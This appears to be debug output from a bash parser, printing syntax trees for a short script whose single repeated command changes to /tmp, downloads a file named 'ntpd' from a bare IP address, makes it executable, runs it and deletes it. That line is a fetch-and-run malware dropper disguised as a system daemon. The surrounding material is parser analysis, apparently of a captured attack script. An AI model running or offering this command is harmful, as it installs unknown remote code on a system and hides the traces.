#!/bin/bash
------------
[PRINT TREE] NewlineNode(lineno=1 pos=(11, 11))
[Parse_PART1] [NewlineNode(lineno=1 pos=(11, 11))]

cd /tmp || cd /; wget http://165.227.106.171/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
------------
[PRINT TREE] ListNode(lineno=1 parts=[CommandNode(lineno=1 parts=[WordNode(discard=False lineno=1 parts=[] pos=(0, 2) word='cd'), WordNode(discard=False lineno=1 parts=[] pos=(3, 7) word='/tmp')] pos=(0, 7)), OperatorNode(lineno=1 op='||' pos=(8, 10)), CommandNode(lineno=1 parts=[WordNode(discard=False lineno=1 parts=[] pos=(11, 13) word='cd'), WordNode(discard=False lineno=1 parts=[] pos=(14, 15) word='/')] pos=(11, 15)), OperatorNode(lineno=1 op=';' pos=(15, 16)), CommandNode(lineno=1 parts=[WordNode(discard=False lineno=1 parts=[] pos=(17, 21) word='wget'), WordNode(discard=False lineno=1 parts=[] pos=(22, 49) word='http://165.227.106.171/ntpd')] pos=(17, 49)), OperatorNode(lineno=1 op=';' pos=(49, 50)), CommandNode(lineno=1 parts=[WordNode(discard=False lineno=1 parts=[] pos=(51, 56) word='chmod'), WordNode(discard=False lineno=1 parts=[] pos=(57, 59) word='+x'), WordNode(discard=False lineno=1 parts=[] pos=(60, 64) word='ntpd')] pos=(51, 64)), OperatorNode(lineno=1 op=';' pos=(64, 65)), CommandNode(lineno=1 parts=[WordNode(discard=False lineno=1 parts=[] pos=(66, 72) word='./ntpd')] pos=(66, 72)), OperatorNode(lineno=1 op=';' pos=(72, 73)), CommandNode(lineno=1 parts=[WordNode(discard=False lineno=1 parts=[] pos=(74, 76) word='rm'), WordNode(discard=False lineno=1 parts=[] pos=(77, 80) word='-rf'), WordNode(discard=False lineno=1 parts=[] pos=(81, 85) word='ntpd')] pos=(74, 85))] pos=(0, 85))
[Parse_PART2] [NewlineNode(lineno=1 pos=(11, 11))]

cd /tmp || cd /; wget http://165.227.106.171/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
------------
[PRINT TREE] ListNode(lineno=1 parts=[CommandNode(lineno=1 parts=[WordNode(discard=False lineno=1 parts=[] pos=(0, 2) word='cd'), WordNode(discard=False lineno=1 parts=[] pos=(3, 7) word='/tmp')] pos=(0, 7)), OperatorNode(lineno=1 op='||' pos=(8, 10)), CommandNode(lineno=1 parts=[WordNode(discard=False lineno=1 parts=[] pos=(11, 13) word='cd'), WordNode(discard=False lineno=1 parts=[] pos=(14, 15) word='/')] pos=(11, 15)), OperatorNode(lineno=1 op=';' pos=(15, 16)), CommandNode(lineno=1 parts=[WordNode(discard=False lineno=1 parts=[] pos=(17, 21) word='wget'), WordNode(discard=False lineno=1 parts=[] pos=(22, 49) word='http://165.227.106.171/ntpd')] pos=(17, 49)), OperatorNode(lineno=1 op=';' pos=(49, 50)), CommandNode(lineno=1 parts=[WordNode(discard=False lineno=1 parts=[] pos=(51, 56) word='chmod'), WordNode(discard=False lineno=1 parts=[] pos=(57, 59) word='+x'), WordNode(discard=False lineno=1 parts=[] pos=(60, 64) word='ntpd')] pos=(51, 64)), OperatorNode(lineno=1 op=';' pos=(64, 65)), CommandNode(lineno=1 parts=[WordNode(discard=False lineno=1 parts=[] pos=(66, 72) word='./ntpd')] pos=(66, 72)), OperatorNode(lineno=1 op=';' pos=(72, 73)), CommandNode(lineno=1 parts=[WordNode(discard=False lineno=1 parts=[] pos=(74, 76) word='rm'), WordNode(discard=False lineno=1 parts=[] pos=(77, 80) word='-rf'), WordNode(discard=False lineno=1 parts=[] pos=(81, 85) word='ntpd')] pos=(74, 85))] pos=(0, 85)) 
[Parse_PART2] [NewlineNode(lineno=1 pos=(11, 11)), ListNode(lineno=2 parts=[CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(12, 14) word='cd'), WordNode(discard=False lineno=2 parts=[] pos=(15, 19) word='/tmp')] pos=(12, 19)), OperatorNode(lineno=2 op='||' pos=(20, 22)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(23, 25) word='cd'), WordNode(discard=False lineno=2 parts=[] pos=(26, 27) word='/')] pos=(23, 27)), OperatorNode(lineno=2 op=';' pos=(27, 28)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(29, 33) word='wget'), WordNode(discard=False lineno=2 parts=[] pos=(34, 61) word='http://165.227.106.171/ntpd')] pos=(29, 61)), OperatorNode(lineno=2 op=';' pos=(61, 62)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(63, 68) word='chmod'), WordNode(discard=False lineno=2 parts=[] pos=(69, 71) word='+x'), WordNode(discard=False lineno=2 parts=[] pos=(72, 76) word='ntpd')] pos=(63, 76)), OperatorNode(lineno=2 op=';' pos=(76, 77)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(78, 84) word='./ntpd')] pos=(78, 84)), OperatorNode(lineno=2 op=';' pos=(84, 85)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(86, 88) word='rm'), WordNode(discard=False lineno=2 parts=[] pos=(89, 92) word='-rf'), WordNode(discard=False lineno=2 parts=[] pos=(93, 97) word='ntpd')] pos=(86, 97))] pos=(12, 97))]
 
[Parse_Final] [ListNode(lineno=2 parts=[CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(12, 14) word='cd'), WordNode(discard=False lineno=2 parts=[] pos=(15, 19) word='/tmp')] pos=(12, 19)), OperatorNode(lineno=2 op='||' pos=(20, 22)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(23, 25) word='cd'), WordNode(discard=False lineno=2 parts=[] pos=(26, 27) word='/')] pos=(23, 27)), OperatorNode(lineno=2 op=';' pos=(27, 28)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(29, 33) word='wget'), WordNode(discard=False lineno=2 parts=[] pos=(34, 61) word='http://165.227.106.171/ntpd')] pos=(29, 61)), OperatorNode(lineno=2 op=';' pos=(61, 62)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(63, 68) word='chmod'), WordNode(discard=False lineno=2 parts=[] pos=(69, 71) word='+x'), WordNode(discard=False lineno=2 parts=[] pos=(72, 76) word='ntpd')] pos=(63, 76)), OperatorNode(lineno=2 op=';' pos=(76, 77)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(78, 84) word='./ntpd')] pos=(78, 84)), OperatorNode(lineno=2 op=';' pos=(84, 85)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(86, 88) word='rm'), WordNode(discard=False lineno=2 parts=[] pos=(89, 92) word='-rf'), WordNode(discard=False lineno=2 parts=[] pos=(93, 97) word='ntpd')] pos=(86, 97))] pos=(12, 97)), ListNode(lineno=3 parts=[CommandNode(lineno=3 parts=[WordNode(discard=False lineno=3 parts=[] pos=(98, 100) word='cd'), WordNode(discard=False lineno=3 parts=[] pos=(101, 105) word='/tmp')] pos=(98, 105)), OperatorNode(lineno=3 op='||' pos=(106, 108)), CommandNode(lineno=3 parts=[WordNode(discard=False lineno=3 parts=[] pos=(109, 111) word='cd'), WordNode(discard=False lineno=3 parts=[] pos=(112, 113) word='/')] pos=(109, 113)), OperatorNode(lineno=3 op=';' pos=(113, 114)), CommandNode(lineno=3 parts=[WordNode(discard=False lineno=3 parts=[] pos=(115, 119) word='wget'), WordNode(discard=False lineno=3 parts=[] pos=(120, 147) word='http://165.227.106.171/ntpd')] pos=(115, 147)), OperatorNode(lineno=3 op=';' pos=(147, 148)), CommandNode(lineno=3 parts=[WordNode(discard=False lineno=3 parts=[] pos=(149, 154) word='chmod'), WordNode(discard=False lineno=3 parts=[] pos=(155, 157) word='+x'), WordNode(discard=False lineno=3 parts=[] pos=(158, 162) word='ntpd')] pos=(149, 162)), OperatorNode(lineno=3 op=';' pos=(162, 163)), CommandNode(lineno=3 parts=[WordNode(discard=False lineno=3 parts=[] pos=(164, 170) word='./ntpd')] pos=(164, 170)), OperatorNode(lineno=3 op=';' pos=(170, 171)), CommandNode(lineno=3 parts=[WordNode(discard=False lineno=3 parts=[] pos=(172, 174) word='rm'), WordNode(discard=False lineno=3 parts=[] pos=(175, 178) word='-rf'), WordNode(discard=False lineno=3 parts=[] pos=(179, 183) word='ntpd')] pos=(172, 183))] pos=(98, 183))]

ListNode(lineno=2 parts=[CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(12, 14) word='cd'), WordNode(discard=False lineno=2 parts=[] pos=(15, 19) word='/tmp')] pos=(12, 19)), OperatorNode(lineno=2 op='||' pos=(20, 22)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(23, 25) word='cd'), WordNode(discard=False lineno=2 parts=[] pos=(26, 27) word='/')] pos=(23, 27)), OperatorNode(lineno=2 op=';' pos=(27, 28)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(29, 33) word='wget'), WordNode(discard=False lineno=2 parts=[] pos=(34, 61) word='http://165.227.106.171/ntpd')] pos=(29, 61)), OperatorNode(lineno=2 op=';' pos=(61, 62)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(63, 68) word='chmod'), WordNode(discard=False lineno=2 parts=[] pos=(69, 71) word='+x'), WordNode(discard=False lineno=2 parts=[] pos=(72, 76) word='ntpd')] pos=(63, 76)), OperatorNode(lineno=2 op=';' pos=(76, 77)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(78, 84) word='./ntpd')] pos=(78, 84)), OperatorNode(lineno=2 op=';' pos=(84, 85)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(86, 88) word='rm'), WordNode(discard=False lineno=2 parts=[] pos=(89, 92) word='-rf'), WordNode(discard=False lineno=2 parts=[] pos=(93, 97) word='ntpd')] pos=(86, 97))] pos=(12, 97))
